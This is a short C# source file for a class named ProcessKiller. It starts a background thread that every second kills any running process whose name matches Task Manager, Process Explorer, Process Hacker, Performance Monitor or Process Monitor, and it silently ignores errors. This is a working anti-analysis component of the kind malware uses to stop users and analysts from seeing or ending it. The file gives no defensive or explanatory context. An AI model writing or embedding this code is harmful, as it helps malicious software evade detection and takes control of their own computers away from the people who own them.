using System;
using System.Diagnostics;
using System.Linq;
using System.Threading;

public class ProcessKiller
{
    private Thread thread;
    private bool running;
    private string[] targets = { "taskmgr", "procexp", "processhacker", "perfmon", "procmon" };

    public ProcessKiller()
    {
        running = true;
        thread = new Thread(Run);
        thread.Start();
    }

    private void Run()
    {
        while (running)
        {
            foreach (var proc in Process.GetProcesses())
            {
                if (targets.Any(t => proc.ProcessName.IndexOf(t, StringComparison.OrdinalIgnoreCase) >= 0))
                {
                    try { proc.Kill(); } catch { }
                }
            }
            Thread.Sleep(1000);
        }
    }
}
